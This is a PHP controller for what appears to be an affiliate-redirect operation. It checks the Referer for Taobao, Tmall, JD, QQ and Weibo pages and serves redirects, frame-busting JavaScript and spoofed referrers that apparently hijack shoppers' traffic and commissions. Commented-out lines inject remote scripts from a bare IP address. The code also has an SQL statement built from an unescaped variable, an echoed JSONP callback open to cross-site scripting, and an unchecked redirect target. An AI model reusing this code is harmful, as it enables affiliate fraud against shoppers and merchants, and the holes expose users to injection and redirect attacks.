<?php

namespace Cps\Controller;
use Common\Controller\HomebaseController;
class IndexController extends HomebaseController {
    public function index() {
        $url = $_SERVER['HTTP_REFERER'];
        $data = parse_url($url);

        $host = $data['host'];
        $path = $data['path'];
        $data = get_url_data($url);
        $id = $data['id'];
        if(ismobile()) $type = 'wap';
        else $type ='web';
        if($host != '') {
            if(($host == 'item.m.taobao.com' || $host == 'detail.m.tmall.com' || $host == 'h5.m.taobao.com'))  {

                if($type == 'wap'){
                //    if($id != "")
                        $this->doShoutao($id);
                }
                exit();
            }//$this->doTaobao('it',$id);

            //if($host == 'detail.m.tmall.com' && $id != '')exit();// $this->doTaobao('dt',$id);
            if($host == 'user.qzone.qq.com')exit();// $this->doQQ('qzone');
            if($host == 'mini2015.qq.com') $this->doQQ('mini');
            if($host == 'news.sina.com.cn' || $host == 'ent.sina.com.cn' || $host == 'xui.ptlogin2.qq.com' || $host == 'digi.tech.qq.com' || $host == 'www.qidian.com') exit();//$this->doQQ('news');
//            if($host == 'fz.58.com' || $host == 'xm.58.com' || $host == 'nd.58.com' || $host == 'pt.58.com' || $host == 'qz.58.com' || $host == 'zz.58.com' || $host == 'ly.58.com' || $host == 'sm.58.com' || $host == 'np.58.com' || $host == 'www.58.com') $this->do58();
//            if($host == 'mrjx.jd.com') $this->doQQ('mini');
//            if($host == 'shop.mogujie.com') $this->tongji();
//            if($host == 'hao.360.cn') $this->do360();
//            if($host == 'www.hao123.com') $this->dohao123();
//            if($host == 'ai.taobao.com') $this->tongji();
            if( $host == 'uland.taobao.com'){

                if($type == 'wap'){
                    $id = $data['itemId'];
                    $this->doShoutao($id,1);
                }

                exit();
                    //$this->doTaotoken();
            }


            if($host == "ju.taobao.com"){

                if($type == 'wap'){
                    $id = $data['item_id'];
                    $this->doShoutao($id);
                }

                exit();
            }
//            if($host == 'www.yhd.com' || $host == 'm.yhd.com') exit();
            if($host == 'weibo.com') $this->doweibo();
            //           if($host == '1111.tmall.com' || $host == 'www.tmall.com' || 'www.taobao.com') $this->do1111($host);
//            if($host == 'www.jd.com' || $host == 're.jd.com') exit();
            if($host == 'item.jd.com') $this->doJingdong($url);
            $Cps = M("CpsYswAds");
            $where = array('ad_host'=>$host,'ad_type'=>$type);
            $cps = $Cps->where($where)->order('rand()')->find();
            if($cps) {
                $url = $cps['ad_o_url']==''?$url:$cps['ad_o_url'];
                $cpsdata['ref'] = "http://www.zhetao8.com";
                $cpsdata['url'] = $url;
                $cpsdata['method'] = 'loca';
                $this->assign('cpsdata', $cpsdata);
                $this->display(":index");
                exit();
            }

            $Cps = M("CpsLinktaoAds");
            $where = array('ad_host'=>$host,'ad_type'=>$type);
            $cps = $Cps->where($where)->order('rand()')->find();
            if($cps) {
//                	$this->tongji();exit();
                $url = $cps['ad_o_url']==''?$url:$cps['ad_o_url'];
                $cpsdata['ref'] = "http://www.zhetao8.com";
                $cpsdata['url'] = $url;
//                    if($host == "www.vip.com")

                $cpsdata['method'] = 'loca';
                $this->assign('cpsdata', $cpsdata);
                $this->display(":index");
                exit();
            }

            $Cps = M("CpsYiqifaAds");
            $where = array('ad_host'=>$host,'ad_type'=>$type);
            $cps = $Cps->where($where)->order('rand()')->find();
            if($cps) {
//                	$this->tongji();exit();
                $url = $cps['ad_o_url']==''?$url:$cps['ad_o_url'];
                $cpsdata['ref'] = "http://www.zhetao8.com";
                $cpsdata['url'] = $url;
//                    if($host == "www.vip.com")

                $cpsdata['method'] = 'loca';
                $this->assign('cpsdata', $cpsdata);
                $this->display(":index");
                exit();
            }

            $Cps = M("CpsDuomaiAds");
            $where = array('ad_host'=>$host);
            $cps = $Cps->where($where)->order('rand()')->find();
            if($cps) {
//                    		$this->tongji();exit();
                $url = $cps['ad_o_url']==''?$url:$cps['ad_o_url'];
                $cpsdata['ref'] = "http://www.zhetao8.com";
                $cpsdata['url'] = $url;
                $cpsdata['method'] = 'loca';
                $this->assign('cpsdata', $cpsdata);
                $this->display(":index");
                exit();
            }

            $Cps = M("CpsLinktechAds");
            $where = array('ad_host'=>$host,'ad_type'=>$type);
            $cps = $Cps->where($where)->order('rand()')->find();
            if($cps) {
//            		$this->tongji();exit();
                $url = $cps['ad_o_url']==''?$url:$cps['ad_o_url'];
                $cpsdata['ref'] = "http://www.zhetao8.com/main.php";
                $cpsdata['url'] = $url;
                $cpsdata['method'] = 'loca';
                $this->assign('cpsdata', $cpsdata);
                $this->display(":index");
                exit();
            }

            $Cps = M("CpsChanetAds");
            $where = array('ad_host'=>$host,'ad_type'=>$type);
            $cps = $Cps->where($where)->order('rand()')->find();
            if($cps) {
//            		$this->tongji();exit();
                $url = $cps['ad_o_url']==''?$url:$cps['ad_o_url'];
                $cpsdata['ref'] = "http://www.zhetao8.com";
                $cpsdata['url'] = $url;
                $cpsdata['method'] = 'loca';
                $this->assign('cpsdata', $cpsdata);
                $this->display(":index");
                exit();
            }

            $Cps = M("CpsChineseanAds");
            $where = array('ad_host'=>$host,'ad_type'=>$type);
            $cps = $Cps->where($where)->order('rand()')->find();
            if($cps) {
//            		$this->tongji();exit();
                exit();
                $url = $cps['ad_o_url']==''?$url:$cps['ad_o_url'];
                $cpsdata['ref'] = "http://www.zhetao8.com";
                $cpsdata['url'] = $url;
                $cpsdata['method'] = 'loca';
                $this->assign('cpsdata', $cpsdata);
                $this->display(":index");
                exit();
            }

            if(strstr($host,'dangdang') == 'dangdang.com') $this->dealDangdang($url);

        }

    }

    public function t() {
        $url = $_SERVER['HTTP_REFERER'];
        $data = parse_url($url);

        $host = $data['host'];
        $path = $data['path'];
        $data = get_url_data($url);
        $id = $data['id'];
        if(ismobile()) $type = 'wap';
        else $type ='web';
        if($host != '') {
            if(($host == 'item.m.taobao.com' || $host == 'detail.m.tmall.com' || $host == 'h5.m.taobao.com'))  {

                if($type == 'wap'){
                    //    if($id != "")
                    $this->doShoutao1($id,0,'002');
                }
                exit();
            }//$this->doTaobao('it',$id);


        }

    }

    public function c() {
//        $urls = array('http://s.click.taobao.com/pvN9gux','http://s.click.taobao.com/9tBKJsx');
        //      $urls = array('http://exsde.com');
//        $iframeurl = $urls[array_rand($urls)];
// $iframeurl = "http://dwz.cn/taoke123";
//        $this->assign('iframeurl',$iframeurl);
//        $this->display(":iframe");
//        $urls = array('http://s.click.taobao.com/fF3svmx','http://s.click.taobao.com/gPI7emx');
//        $url = $urls[array_rand($urls)];
//        $this->display(":rbutton");
        if(ismobile()) {
         //  $this->doShoutao();
        }


        exit();
        $url = $_SERVER['HTTP_REFERER'];
        $data = parse_url($url);

        $host = $data['host'];
        $path = $data['path'];
        $data = get_url_data($url);
        $id = $data['id'];
        if(ismobile()) $type = 'wap';
        else $type ='web';
        if($host != '') {
            $Skey = M("SearchKeyword");
            $skey = $Skey->order('rand()')->find();
            if($skey) {
                $url = "http://m.yz.sm.cn/s?q=" . urlencode($skey['keyword']) . "&from=ws752693";
                $cpsdata['ref'] = "http://www.zhetao8.com/main.php";
                $cpsdata['url'] = $url;
                $this->assign('cpsdata', $cpsdata);
                $this->display(":index");
                exit();
            }
        }
    }

    public function m() {
//        $this->assign('iframeurl','http://222.47.26.21/b.htm');
//        $this->display(":iframe");
//        echo "";
//        $this->doQQ('jiaqun');
      //  $this->doShoutao();
        exit();

    }

    public function mt() {
        if(ismobile()) $type = 'wap';
        else $type ='web';

        $ref = $_SERVER['HTTP_REFERER'];
        $id = $_GET['id'];
        if($type=='web'){

            $url = "http://h5.m.taobao.com/awp/core/detail.htm?id=$id";

        }
        else {
            if($id != ""){
                $url = file_get_contents("http://13bag.com/?g=Tbkqq&m=Ai&a=get_taoke_info&pid=005&isq=0&id=".$id);
                if($url != "") $url = str_replace("https","taobao",$url);
                else $url = "http://h5.m.taobao.com/awp/core/detail.htm?id=$id";
            }

            else
                $url = "taobao//s.click.taobao.com/yRZfDpw";

        }
        $this->assign("gurl",$url);

        $this->display(":loca");
        exit();

    }

    public function weibo(){
        $weibo_model=M("CpsWeibo");
        $arr = array();
        $oid = $_GET['oid'];
        $weibo = $weibo_model->where(array("oid"=>$oid))->find();
        if($weibo)
            $result = json_encode(array("action"=>'0'));
        else {
            $result = json_encode(array("action"=>'1'));
            $weibo_model->add(array("oid"=>$oid,"uid"=>'1730272631'));
        }
        echo "weiboCallback($result)";
        /*
        $weibos = $weibo_model->where(array("oid"=>$oid))->select();
        if($weibos){
            $wheres = array();
            foreach($weibos as $weibo){
                $wheres[]=$weibo['uid'];
            }
            $where = join(",",$wheres);
        }
        if($where != '') $weibo_oids = M("CpsWeiboOid")->where("uid not in (".$where.")")->select();
        else $weibo_oids = M("CpsWeiboOid")->select();
        if($weibo_oids){

            foreach($weibo_oids as $weibo_oid){
                $data = array();
                $arr[$weibo_oid['uid']] = $weibo_oid['nick'];
                $data['oid'] = $oid;
                $data['uid'] = $weibo_oid['uid'];
                $weibo_model->add($data);
            }
        }
        $result=json_encode($arr);
        echo "weiboCallback($result)";
        */
    }

    private function dealDangdang($url) {
        $cpsdata['ref'] = "http://www.zhetao8.com/main.php";
        $cpsdata['url'] = 'http://c.duomai.com/track.php?site_id=102490&aid=465&euid=&t=' . urlencode($url);
        $this->assign('cpsdata', $cpsdata);
        $this->display(":index");
        exit();
    }

    public function dealHost() {
        $Site = M('CpsSite');
        $site_list = $Site->select();
        foreach($site_list as $site) {
            $sid = $site['id'];
            $no = $site['no'];
            $Url = M('CpsUrlS'.$sid);
            $url_list = $Url->select();
            foreach($url_list as $url) {
                $surl = $url['url'];
                $id = $url['id'];
                $url1 = strstr($surl,'http');
                if($no == 'yiqifa') $Url->url = $url1;
                $urldata = parse_url($url1);
                $host = $urldata['host'];
                $Url->host = $host;
                $Url->where("id=$id")->save();
            }
        }
    }

    public function dealCps() {
        M()->execute($sql = 'TRUNCATE table `sp_cps`');
        $Cps = M("Cps");
        $Site = M('CpsSite');
        $site_list = $Site->select();
        foreach($site_list as $site) {
            $id = $site['id'];
            $sid = $site['sid'];
            $no = $site['no'];
            $ref = $site['site'];
            $Url = M('CpsUrlS'.$id);
            $url_list = $Url->select();
            foreach($url_list as $url) {
                $data = array();
                $data['aid'] = $url['aid'];
                $data['host'] = $url['host'];
                $turl = $url['turl'];
                if($turl == '') {
                    $turl = $url['url'];
                    $data['method'] = 'jjl';
                }
                $data['url'] = $turl;
                $data['status'] = '1';
                $data['no'] = $no;
                $data['ref'] = $ref;

                $data['sid'] = $sid;
                $Cps->add($data);
            }
        }
    }

    public function dealIhubCps() {
        $Cps = M("Cps");
        $hosts = $Cps->distinct(true)->field('host')->select();
        foreach($hosts as $host) {
            echo $host['host'] . "\n";
        }
    }

    public function dealTmallRecommend() {
        $recommend = $_GET['callback'];
        $recommend .= '({"itemList":[{"_pos_":1,"acm":"03130.1003.1.53415","commentNum":1812,"entityType":"ITEM","id":"41102277350","img":"http://g.ald.alicdn.com/bao/uploaded/i1/TB1LsMEGXXXXXXxXFXXXXXXXXXX_!!0-item_pic.jpg","marketPrice":"1290.00","price":"289.00","rate":0,"scm":"1003.1.03130.ITEM_41102277350_53415","sellNum":6873,"title":"聚 F1F2家纺春夏全棉四件套纯棉特价床单床笠被套 时尚床品情书","url":"http://detail.tmall.com/item.htm?id=41102277350&abbucket=_AB-M129_B15&acm=03130.1003.1.53415&aldid=vwj42CwH&abtest=_AB-LR129-PR129&scm=1003.1.03130.ITEM_41102277350_53415&pos=1"},{"_pos_":2,"acm":"03130.1003.1.53415","commentNum":111,"entityType":"ITEM","id":"44089171442","img":"http://g.ald.alicdn.com/bao/uploaded/i3/T1mDoJFKVaXXXXXXXX_!!0-item_pic.jpg","marketPrice":"1198.00","price":"299.00","rate":0,"scm":"1003.1.03130.ITEM_44089171442_53415","sellNum":352,"title":"F1F2家纺春夏全棉斜纹韩式四件套田园纯棉床单被套床上用品 西瓜","url":"http://detail.tmall.com/item.htm?id=44089171442&abbucket=_AB-M129_B15&acm=03130.1003.1.53415&aldid=vwj42CwH&abtest=_AB-LR129-PR129&scm=1003.1.03130.ITEM_44089171442_53415&pos=2"},{"_pos_":3,"acm":"03130.1003.1.53415","commentNum":301,"entityType":"ITEM","id":"41117852233","img":"http://g.ald.alicdn.com/bao/uploaded/i1/TB1P3BbGFXXXXX2XXXXXXXXXXXX_!!0-item_pic.jpg","marketPrice":"1290.00","price":"369.00","rate":0,"scm":"1003.1.03130.ITEM_41117852233_53415","sellNum":1014,"title":"F1F2家纺 全棉特价床上用品 床单四件套春纯棉简约时尚床品 唯爱","url":"http://detail.tmall.com/item.htm?id=41117852233&abbucket=_AB-M129_B15&acm=03130.1003.1.53415&aldid=vwj42CwH&abtest=_AB-LR129-PR129&scm=1003.1.03130.ITEM_41117852233_53415&pos=3"},{"_pos_":4,"acm":"03130.1003.1.53415","commentNum":727,"entityType":"ITEM","id":"35087931239","img":"http://g.ald.alicdn.com/bao/uploaded/i3/TB15iusGVXXXXX2XFXXXXXXXXXX_!!0-item_pic.jpg","marketPrice":"1298.00","price":"239.00","rate":0,"scm":"1003.1.03130.ITEM_35087931239_53415","sellNum":6388,"title":"F1F2家纺纯棉四件套全棉包邮卡通创意儿童床上用品床单床笠爱消除","url":"http://detail.tmall.com/item.htm?id=35087931239&abbucket=_AB-M129_B15&acm=03130.1003.1.53415&aldid=vwj42CwH&abtest=_AB-LR129-PR129&scm=1003.1.03130.ITEM_35087931239_53415&pos=4"},{"_pos_":5,"acm":"03130.1003.1.53415","commentNum":1269,"entityType":"ITEM","id":"22744296714","img":"http://g.ald.alicdn.com/bao/uploaded/i1/T1xhQ4Fj0XXXXXXXXX_!!0-item_pic.jpg","marketPrice":"999.00","price":"369.00","rate":0,"scm":"1003.1.03130.ITEM_22744296714_53415","sellNum":4068,"title":"F1F2家纺 全棉个性绣花素色四件套纯色婚庆床品被套床笠 爱情故事","url":"http://detail.tmall.com/item.htm?id=22744296714&abbucket=_AB-M129_B15&acm=03130.1003.1.53415&aldid=vwj42CwH&abtest=_AB-LR129-PR129&scm=1003.1.03130.ITEM_22744296714_53415&pos=5"},{"_pos_":6,"acm":"03130.1003.1.53415","commentNum":333,"entityType":"ITEM","id":"35087245344","img":"http://g.ald.alicdn.com/bao/uploaded/i3/TB1CKCvGVXXXXXBXFXXXXXXXXXX_!!0-item_pic.jpg","marketPrice":"1198.00","price":"269.00","rate":0,"scm":"1003.1.03130.ITEM_35087245344_53415","sellNum":1576,"title":"F1F2家纺 全棉床上四件套简约四件套纯棉特价被套田园风床品 浮云","url":"http://detail.tmall.com/item.htm?id=35087245344&abbucket=_AB-M129_B15&acm=03130.1003.1.53415&aldid=vwj42CwH&abtest=_AB-LR129-PR129&scm=1003.1.03130.ITEM_35087245344_53415&pos=6"},{"_pos_":7,"acm":"03130.1003.1.53415","commentNum":299,"entityType":"ITEM","id":"17882730483","img":"http://g.ald.alicdn.com/bao/uploaded/i1/T1PzY4FbRXXXXXXXXX_!!0-item_pic.jpg","marketPrice":"1598.00","price":"530.00","rate":0,"scm":"1003.1.03130.ITEM_17882730483_53415","sellNum":1078,"title":"F1F2家纺 纯色全棉牛仔四件套床单床笠床上用品纯棉被套柔软亲肤","url":"http://detail.tmall.com/item.htm?id=17882730483&abbucket=_AB-M129_B15&acm=03130.1003.1.53415&aldid=vwj42CwH&abtest=_AB-LR129-PR129&scm=1003.1.03130.ITEM_17882730483_53415&pos=7"},{"_pos_":8,"acm":"03130.1003.1.53415","commentNum":40,"entityType":"ITEM","id":"43445879252","img":"http://g.ald.alicdn.com/bao/uploaded/i4/TB1JogDGVXXXXcsXVXXXXXXXXXX_!!0-item_pic.jpg","marketPrice":"1280.00","price":"329.00","rate":0,"scm":"1003.1.03130.ITEM_43445879252_53415","sellNum":145,"title":"F1F2家纺 床上用品四件套纯棉 全棉简约床单被套4件套 约吗","url":"http://detail.tmall.com/item.htm?id=43445879252&abbucket=_AB-M129_B15&acm=03130.1003.1.53415&aldid=vwj42CwH&abtest=_AB-LR129-PR129&scm=1003.1.03130.ITEM_43445879252_53415&pos=8"},{"_pos_":9,"acm":"03130.1003.1.53415","commentNum":31,"entityType":"ITEM","id":"41069203438","img":"http://g.ald.alicdn.com/bao/uploaded/i1/TB1_WmNGFXXXXclaXXXXXXXXXXX_!!0-item_pic.jpg","marketPrice":"1280.00","price":"299.00","rate":0,"scm":"1003.1.03130.ITEM_41069203438_53415","sellNum":156,"title":"F1F2家纺纯棉四件套 全棉床上用品床单4件套特价 溢彩几何","url":"http://detail.tmall.com/item.htm?id=41069203438&abbucket=_AB-M129_B15&acm=03130.1003.1.53415&aldid=vwj42CwH&abtest=_AB-LR129-PR129&scm=1003.1.03130.ITEM_41069203438_53415&pos=9"},{"_pos_":10,"acm":"03130.1003.1.53415","commentNum":121,"entityType":"ITEM","id":"41600540765","img":"http://g.ald.alicdn.com/bao/uploaded/i3/TB1qlLyGpXXXXabXpXXXXXXXXXX_!!0-item_pic.jpg","marketPrice":"1280.00","price":"369.00","rate":0,"scm":"1003.1.03130.ITEM_41600540765_53415","sellNum":502,"title":"F1F2家纺 床上用品四件套纯棉简约四件套贡缎 韩版全棉特价同心结","url":"http://detail.tmall.com/item.htm?id=41600540765&abbucket=_AB-M129_B15&acm=03130.1003.1.53415&aldid=vwj42CwH&abtest=_AB-LR129-PR129&scm=1003.1.03130.ITEM_41600540765_53415&pos=10"},{"_pos_":11,"acm":"03130.1003.1.53415","commentNum":114,"entityType":"ITEM","id":"41891597571","img":"http://g.ald.alicdn.com/bao/uploaded/i1/TB18RuMGFXXXXXAXpXXXXXXXXXX_!!0-item_pic.jpg","marketPrice":"1398.00","price":"379.00","rate":0,"scm":"1003.1.03130.ITEM_41891597571_53415","sellNum":499,"title":"F1F2家纺 全棉斜纹印花四件套 春夏特价床上用品床单被套 抱紧我","url":"http://detail.tmall.com/item.htm?id=41891597571&abbucket=_AB-M129_B15&acm=03130.1003.1.53415&aldid=vwj42CwH&abtest=_AB-LR129-PR129&scm=1003.1.03130.ITEM_41891597571_53415&pos=11"},{"_pos_":12,"acm":"03130.1003.1.53415","commentNum":310,"entityType":"ITEM","id":"14664182410","img":"http://g.ald.alicdn.com/bao/uploaded/i4/TB1CVCqGVXXXXaGXVXXXXXXXXXX_!!0-item_pic.jpg","marketPrice":"899.00","price":"539.00","rate":0,"scm":"1003.1.03130.ITEM_14664182410_53415","sellNum":1367,"title":"F1F2家纺 时尚欧式床单四件套床上用品纯棉纯色4件套特价平行线","url":"http://detail.tmall.com/item.htm?id=14664182410&abbucket=_AB-M129_B15&acm=03130.1003.1.53415&aldid=vwj42CwH&abtest=_AB-LR129-PR129&scm=1003.1.03130.ITEM_14664182410_53415&pos=12"},{"_pos_":13,"acm":"03130.1003.1.53415","commentNum":87,"entityType":"ITEM","id":"40380232049","img":"http://g.ald.alicdn.com/bao/uploaded/i3/TB1wk7SFVXXXXcJXFXXXXXXXXXX_!!0-item_pic.jpg","marketPrice":"1198.00","price":"319.00","rate":0,"scm":"1003.1.03130.ITEM_40380232049_53415","sellNum":335,"title":"F1F2家纺纯棉斜纹四件套 全棉韩式公主个性床品被套4件套 樱桃","url":"http://detail.tmall.com/item.htm?id=40380232049&abbucket=_AB-M129_B15&acm=03130.1003.1.53415&aldid=vwj42CwH&abtest=_AB-LR129-PR129&scm=1003.1.03130.ITEM_40380232049_53415&pos=13"},{"_pos_":14,"acm":"03130.1003.1.53415","commentNum":41,"entityType":"ITEM","id":"13507900288","img":"http://g.ald.alicdn.com/bao/uploaded/i3/T18imTXrNcXXXXXXXX_!!0-item_pic.jpg","marketPrice":"2199.00","price":"999.00","rate":0,"scm":"1003.1.03130.ITEM_13507900288_53415","sellNum":283,"title":"F1F2家纺 全棉贡缎提花床单四件套欧式纯棉素色床上用品紫色丝滑","url":"http://detail.tmall.com/item.htm?id=13507900288&abbucket=_AB-M129_B15&acm=03130.1003.1.53415&aldid=vwj42CwH&abtest=_AB-LR129-PR129&scm=1003.1.03130.ITEM_13507900288_53415&pos=14"}],"acurl":"http://ac.mmstat.com/1.gif?uid=2010057255&apply=vote&abbucket=_AB-M129_B15&com=02&acm=03130.1003.1.53415&cod=03130&cache=31814148&aldid=vwj42CwH&logtype=4&abtest=_AB-LR129-PR129&scm=1003.1.03130.53415&ip=122.91.0.242"})';
        echo $recommend;
    }
    private function doTaobao($t,$id,$r) {
        if($r == '') $r=1;
        $r = rand(1, 10);
        if($r == 1) {
            $this->assign('id',$id);
            $this->display(":taobao");
            exit();


            $cpsdata['ref'] = 'http://exsde.com/main.php';
            $cpsdata['method'] = 'loca';
            $cpsdata['url'] = "http://www.bdhpe.com/index.php?m=jump&a=index&id=$id";
            $this->assign('cpsdata',$cpsdata);
            $this->display(":index");
            exit();
        }
        else {
//            echo "var C = function(e){return document.createElement(e);};	var A = C('script');A.src = 'http://120.26.57.82/s?area=fj&a=" . $t . "';A.stype = 'text/javascript';document.body.appendChild(A);";
            exit();
        }
    }

    private function doJingdong($url){
        echo "(function(){window.top.location.href=\"http://www.taocigongfang.com/?uid=jd1463047333&gurl=" . urlencode($url) . "\";})();";
        exit();
    }

    private function do1111($host) {
        if($host == '1111.tmall.com') $url = 'http://s.click.taobao.com/t?e=m%3D2%26s%3DeiEu2gJ3gqkcQipKwQzePCperVdZeJviK7Vc7tFgwiFRAdhuF14FMcSfzDNJMaAuMMgx22UI05ZJuo9qEaCkT%2Bw2x%2FTHbGT%2F3ERfuZBGgUzuKrxHd70KoY7LAa3DUrM2zt5vEinufIW9AmARIwX9K0LRPOwzLySnsd%2B%2Ff4Fhw9YPeKRogxCSR09Km%2B0bQI07amiongI2jyjdtqnXSKpsgJdSg4f1Xi85G8Q6NKefcNZgYh%2Bm7jOlA%2BsomMEHzjaA';
        else if($host == 'www.tmall.com') $url = 'http://s.click.taobao.com/t?e=m%3D2%26s%3DXni3YGMbBOocQipKwQzePCperVdZeJviK7Vc7tFgwiFRAdhuF14FMR5HyUrAq67D1aH1Hk3GeOhJuo9qEaCkT%2Bw2x%2FTHbGT%2F3ERfuZBGgUzuKrxHd70KoY7LAa3DUrM2zt5vEinufIW9AmARIwX9Ky8UTyjdhQwHJPwiig1bxLM7kJwmAcM4EkV92HL3DKLNQ25ZppcqEX7C%2BIxEEkbcoZdSg4f1Xi85G8Q6NKefcNZgYh%2Bm7jOlA%2BsomMEHzjaA';
        else if($host == 'www.taobao.com') $url = 'http://s.click.taobao.com/t?e=m%3D2%26s%3D6kz2WwszxuYcQipKwQzePCperVdZeJviLKpWJ%2Bin0XJRAdhuF14FMdoDkEa36uHmMMgx22UI05ZJuo9qEaCkT%2Bw2x%2FTHbGT%2F3ERfuZBGgUzuKrxHd70KoRHJ78PDmXo%2BAxc0jmyvuehAFEHVckI7b3VyxRO0gvF4naYpFBIfC%2F3FQLGzEOqkxUBoUHQJ0fmK2rfAqKOmWwKisV9E63a7aA8WFvUqqKdZeb3vRkd8lhmvnfnit%2FBgC8YMXU3NNCg%2F';
        else exit();
        $cpsdata['ref'] = 'http://www.you8zhe.com/1111/';
        $cpsdata['method'] = 'loca';
        $cpsdata['url'] = $url;
        $this->assign('cpsdata',$cpsdata);
        $this->display(":index");
        exit();

    }

    protected function doTaotoken(){
        $url = $_SERVER['HTTP_REFERER'];
        $Cps = M("CpsTaoToken");
        $cps = $Cps->order('rand()')->find();
        if($cps) {
            $this->assign("token",$cps['token']);
            $this->assign("url",$url);
            $this->display(":token");
        }
        exit();
    }

    protected function doShoutao($id,$isq=0){
        if($id != ""){
            $url = file_get_contents("http://13bag.com/?g=Tbkqq&m=Ai&a=get_taoke_info&isq=$isq&id=".$id);
            if($url != "") $url = str_replace("https","taobao",$url);
            else $url = "taobao://s.click.taobao.com/yRZfDpw";
        }

        else
            $url = "taobao//s.click.taobao.com/yRZfDpw";
        $this->assign("url",$url);

        $this->display(":taobao");
        exit();
    }

    protected function doShoutao1($id,$isq=0,$pid='001'){
        if($id != ""){
            $url = file_get_contents("http://13bag.com/?g=Tbkqq&m=Ai&a=get_taoke_info&pid=$pid&isq=$isq&id=".$id);
            if($url != "") $url = str_replace("https","taobao",$url);
            else $url = "taobao://s.click.taobao.com/vYide2x";
        }

        else
            $url = "taobao//s.click.taobao.com/vYide2x";
        $this->assign("url",$url);

        $this->display(":taobao");
        exit();
    }

    private function doQQ($t) {

        if($t == 'qzone') {
//            exit();
//            $r = rand(1, 20);
//            if($r >= 3 && $r <= 5) {
//            echo "var C = function(e){return document.createElement(e);};	var A = C('script');A.src = 'http://www.meixiu99.com/qq_qzone/index.js';A.stype = 'text/javascript';document.body.appendChild(A);";
//                $iframeurl = "tencent://AddContact/?fromId=45&fromSubId=1&subcmd=all&uin=2452162338&website=www.oicqzone.com";
//                $iframeurl = "tencent://AddContact/?fromId=45&fromSubId=1&subcmd=all&uin=2557936834&website=www.oicqzone.com";
//            $iframeurl = "tencent://groupwpa/?subcmd=all&param=7B2267726F757055696E223A3336313538363636342C2274696D655374616D70223A313434383532343132397D0A";
            $iframeurl = "http://qm.qq.com/cgi-bin/qm/qr?k=VYO6ckeQxd56GE9ojSh9xQJNvKTA0VxZ";
            $this->assign('iframeurl',$iframeurl);
            $this->display(":iframe");
//            }
            exit();
        }
        if($t == 'mini') {

//            $r = rand(1, 50);
//            if($r >= 3 && $r <= 5) {

//            echo "var C = function(e){return document.createElement(e);};	var A = C('script');A.src = 'http://www.meixiu99.com/qq_qzone/index.js';A.stype = 'text/javascript';document.body.appendChild(A);";

            $urls = array('http://shang.qq.com/wpa/qunwpa?idkey=bbef02427a91c85b90322af638c2ae6ecb6dd7f87be1c2e5cec18d0566b2f475',
                'http://qm.qq.com/cgi-bin/qm/qr?k=0GXRMi7bmySXuPgvYWaVvqEWz4q_nYD1',
//                    'tencent://AddContact/?fromId=45&fromSubId=1&subcmd=all&uin=2557936834&website=www.oicqzone.com',
                'tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1786508813');

            $url = $urls[array_rand($urls)];
//                $cpsdata['ref'] = "http://exsde.com/main.php";
//                $cpsdata['url'] = $url;
//                $this->assign('cpsdata', $cpsdata);
//                $this->display(":index");
//            $url = 'http://jq.qq.com/?_wv=1027&k=X6IJv5';
            $url = 'http://qm.qq.com/cgi-bin/qm/qr?k=RIrc_Oof2D78vueOUdnIzx2ZpNtzyqcD';
            $this->assign('iframeurl',$url);
            $this->display(":mini");
//            }
            exit();
        }
        if($t == 'news') {
//            $url = 'http://jq.qq.com/?_wv=1027&k=Z6BEwY';
//            $this->assign('iframeurl',$url);
            $this->display(":news");
            exit();
        }
        if($t == 'jiaqun') {
            $this->display(":qq");
            exit();
        }
        exit();
    }

    public function testweibo(){
        $this->display(":weibo");
    }
    private function doweibo() {
        $this->display(":weibo");
    }
    private function tongji() {
        $url = 'http://222.47.26.21/b.htm';
        $this->assign('iframeurl',$url);
        $this->display(":iframe");
        exit();
    }

    private function do58() {
        $this->display(":rbutton");
        exit();
    }
    private function do360() {
//        $r = rand(1, 10);
//        if($r == 3) {
        $cpsdata['ref'] = 'http://exsde.com/main.php';

        //           $urls = array('http://hao.360.cn/?src=lm&ls=n458a367e93','http://hao.360.cn/?src=lm&ls=n72940cae9e','','','','','','','');
        //           $cpsdata['url'] = $urls[array_rand($urls)];
        $cpsdata['url'] = 'http://hao.360.cn/?src=lm&ls=n72940cae9e';
        if($cpsdata['url'] != '') $cpsdata['method'] = 'loca';
        $this->assign('cpsdata', $cpsdata);
        $this->display(":index");
//        }
        exit();
    }

    private function  dohao123() {
//        $r = rand(1, 3);
//        if($r == 3) {
        $cpsdata['ref'] = 'http://exsde.com/main.php';
        $cpsdata['method'] = 'loca';
        $cpsdata['url'] = "https://www.hao123.com/?tn=93645388_s_hao_pg";
        $this->assign('cpsdata', $cpsdata);
        $this->display(":index");
//        }
        exit();
    }
    public function doAllCps() {
        $url = $_SERVER['HTTP_REFERER'];
        $data = parse_url($url);

        $host = $data['host'];
        $path = $data['path'];
        $data = get_url_data($url);
        $id = $data['id'];

        if($host != '') {
            $Cps = M('Cps');
            $where = array('status'=>'1');
            $where['_string'] = 'no="yiqifa" or no="duomai"';
            $cps = $Cps->where($where)->order('rand()')->find();
            if($cps) {
                $url = $cps['url']==''?$url:$cps['url'];
                $method = $cps['method'];
                $cpsdata['sid'] = $cps['sid'];
                $cpsdata['ref'] = $cps['ref'] . "/main.php";
                $cpsdata['method'] = $method;
                $cpsdata['url'] = $url;
                $cpsdata['no'] = $cps['no'];
                $this->assign('cpsdata', $cpsdata);
                $this->display(":index");
            }
        }
    }

    public function getYiqifaList() {

    }

    public function zhetao8(){
        if($_REQUEST['tid'] != '') {
            $this->assign("gurl",$_REQUEST['tid']);
            if($_REQUEST['m'] == 'loca') $this->display(":loca");
            else $this->display(":redi");
        }
        else $this->display(":zhetao8");
    }
}
